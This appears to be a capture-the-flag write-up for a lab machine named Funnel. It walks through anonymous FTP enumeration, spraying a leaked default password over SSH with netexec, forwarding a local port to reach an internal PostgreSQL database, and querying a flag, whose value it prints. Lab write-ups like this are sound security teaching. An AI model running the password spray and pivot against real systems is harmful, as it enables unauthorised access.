System: Linux
Difficulty: Very Easy

IP Address: 10.129.228.195

# System Flag

Ports are enumerated on the machine.
```
kali@kali:~$ sudo nmap 10.129.228.195 -sC -sV
```

Here are the results.
```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.10.14.154
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 ftp      ftp          4096 Nov 28  2022 mail_backup
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

Here are the contents of the files.
```
kali@kali:~$ cat welcome_28112022
Frome: root@funnel.htb
To: optimus@funnel.htb albert@funnel.htb andreas@funnel.htb christine@funnel.htb maria@funnel.htb
Subject:Welcome to the team!

Hello everyone,
We would like to welcome you to our team.
We think you’ll be a great asset to the "Funnel" team and want to make sure you get settled in as smoothly as possible.
We have set up your accounts that you will need to access our internal infrastracture. Please, read through the attached password policy with extreme care.
All the steps mentioned there should be completed as soon as possible. If you have any questions or concerns feel free to reach directly to your manager.
We hope that you will have an amazing time with us,
The funnel team.
```

After examining the PDF file, it is possible to see that the default password is `funnel123#!#`.
There must be a user that still uses this password among the receipts of the message.

A userlist is made. Here are the contents of the `users.txt`.
```
root
optimus
albert
andreas
christine
maria
```

Usernames are now brute forced through this password.
```
netexec ssh 10.129.228.195 -u users.txt -p 'funnel123#!#' --continue-on-success
```

User `christine` still had the default password of `funnel123#!#` set up.
```
SSH         10.129.228.195  22     10.129.228.195   [+] christine:funnel123#!#  Linux - Shell access!
```

While SSH access works, the flag was not present in the directories.
However, there was an internal port service listening on localhost.
```
christine@funnel:~$ ss -tnlp
```

The port number is 5432 and it has been identified as PostgreSQL.
```
State    Recv-Q   Send-Q     Local Address:Port        Peer Address:Port
<SNIP>
LISTEN   0        4096           127.0.0.1:5432             0.0.0.0:*
```

Double checking for the name.
```
christine@funnel:~$ ss -tl
```

```
State    Recv-Q   Send-Q     Local Address:Port        Peer Address:Port
<SNIP>
LISTEN  0        4096           127.0.0.1:postgresql          0.0.0.0:*
```

Local Port Forwarding is used to access the port through the Attacker System.
```
ssh -L 1234:127.0.0.1:5432 christine@10.129.228.195
```

This command will interact with the service directly from the attacker's machine.
```
kali@kali:~$ psql -h localhost -U christine -p 1234
```

Those commands are used to access the database and list the tables.
```
\l
\c secrets
\dt
```

The flag can be now queried.
```
select * from flag;
```

Here is the contents of the flag.
```
cf277664b1771217d7006acdea006db1
```